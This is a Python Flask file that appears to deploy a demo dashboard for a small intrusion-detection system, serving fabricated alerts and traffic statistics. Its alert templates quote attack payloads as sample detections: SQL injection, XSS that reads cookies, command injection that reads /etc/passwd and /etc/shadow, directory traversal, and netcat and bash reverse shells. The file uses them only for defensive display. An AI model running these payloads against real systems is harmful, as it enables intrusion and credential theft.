"""
Mini IDS — Vercel Deployment Entry Point
==========================================
Serves the IDS dashboard with realistic demo data for showcase purposes.
The actual packet sniffing runs locally (see mini_ids.py); this entry
point provides a fully working demo dashboard on Vercel's serverless platform.
"""

import time
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, jsonify

# ─── Demo Data Generator ─────────────────────────────────────────────────────

_DEMO_SOURCES = [
    "192.168.1.105", "10.0.0.23", "172.16.0.44", "192.168.1.1",
    "10.0.0.99", "192.168.0.37", "172.16.5.12", "10.10.1.8",
]

_DEMO_MACS = [
    "aa:bb:cc:11:22:33", "de:ad:be:ef:00:01", "ff:ee:dd:cc:bb:aa",
    "00:1a:2b:3c:4d:5e", "11:22:33:44:55:66",
]

_DEMO_ALERTS = [
    {
        "type": "ARP Spoof",
        "severity": "CRITICAL",
        "description": "MAC changed! {src} was {mac1}, now claims to be {mac2} — possible ARP spoofing",
    },
    {
        "type": "Gratuitous ARP",
        "severity": "HIGH",
        "description": "Gratuitous ARP reply from {mac1} claiming IP {src} — often used in ARP spoofing",
    },
    {
        "type": "ARP Flood",
        "severity": "HIGH",
        "description": "ARP flood detected — {count} ARP packets from {mac1} in 10s",
    },
    {
        "type": "SQL Injection",
        "severity": "HIGH",
        "description": "Malicious payload detected in packet from {src}: «' OR 1=1 --»",
    },
    {
        "type": "SQL Injection (tautology)",
        "severity": "HIGH",
        "description": "Malicious payload detected in packet from {src}: «' OR '1'='1»",
    },
    {
        "type": "SQL Injection (stacked query)",
        "severity": "HIGH",
        "description": "Malicious payload detected in packet from {src}: «; DROP TABLE users»",
    },
    {
        "type": "Cross-Site Scripting (XSS)",
        "severity": "HIGH",
        "description": "Malicious payload detected in packet from {src}: «<script>alert('xss')</script>»",
    },
    {
        "type": "XSS (event handler)",
        "severity": "MEDIUM",
        "description": "Malicious payload detected in packet from {src}: «onerror=alert(document.cookie)»",
    },
    {
        "type": "OS Command Injection",
        "severity": "CRITICAL",
        "description": "Malicious payload detected in packet from {src}: «; cat /etc/passwd»",
    },
    {
        "type": "Pipe Command Injection",
        "severity": "CRITICAL",
        "description": "Malicious payload detected in packet from {src}: «| whoami»",
    },
    {
        "type": "Directory Traversal",
        "severity": "HIGH",
        "description": "Malicious payload detected in packet from {src}: «../../etc/passwd»",
    },
    {
        "type": "Sensitive File Access",
        "severity": "CRITICAL",
        "description": "Malicious payload detected in packet from {src}: «/etc/shadow»",
    },
    {
        "type": "Reverse Shell Attempt",
        "severity": "CRITICAL",
        "description": "Malicious payload detected in packet from {src}: «nc -e /bin/sh {src} 4444»",
    },
    {
        "type": "Bash Reverse Shell",
        "severity": "CRITICAL",
        "description": "Malicious payload detected in packet from {src}: «bash -i >& /dev/tcp/{src}/4444»",
    },
    {
        "type": "Suspicious HTTP Method",
        "severity": "LOW",
        "description": "Malicious payload detected in packet from {src}: «DELETE /api/users»",
    },
]


def _generate_demo_alerts(count: int = 25) -> list[dict]:
    """Generate a fixed set of realistic-looking demo alerts."""
    random.seed(42)  # Deterministic so the page looks consistent
    alerts = []
    base_time = datetime.now() - timedelta(minutes=count * 2)

    for i in range(count):
        template = random.choice(_DEMO_ALERTS)
        src = random.choice(_DEMO_SOURCES)
        mac1 = random.choice(_DEMO_MACS)
        mac2 = random.choice([m for m in _DEMO_MACS if m != mac1])
        ts = base_time + timedelta(minutes=i * 2, seconds=random.randint(0, 59))

        alerts.append({
            "id": i + 1,
            "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"),
            "epoch": ts.timestamp(),
            "type": template["type"],
            "severity": template["severity"],
            "source": src,
            "description": template["description"].format(
                src=src, mac1=mac1, mac2=mac2, count=random.randint(30, 85)
            ),
            "details": {},
        })

    return alerts


# ─── Pre-generate demo data ──────────────────────────────────────────────────

_demo_alerts = _generate_demo_alerts(25)

_demo_stats = {
    "total_packets": 148_392,
    "arp_packets": 12_847,
    "tcp_packets": 98_210,
    "udp_packets": 37_335,
    "alerts_count": len(_demo_alerts),
    "start_time": time.time() - 3600,  # Pretend we've been running for 1 hour
}

# ─── Flask App ────────────────────────────────────────────────────────────────

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("dashboard.html")


@app.route("/api/alerts")
def api_alerts():
    return jsonify(list(reversed(_demo_alerts)))


@app.route("/api/stats")
def api_stats():
    stats = dict(_demo_stats)
    stats["uptime_seconds"] = int(time.time() - stats["start_time"])
    stats["unique_attackers"] = len({a["source"] for a in _demo_alerts})
    return stats


# ─── Local dev server ────────────────────────────────────────────────────────

if __name__ == "__main__":
    app.run(debug=True, port=5000)
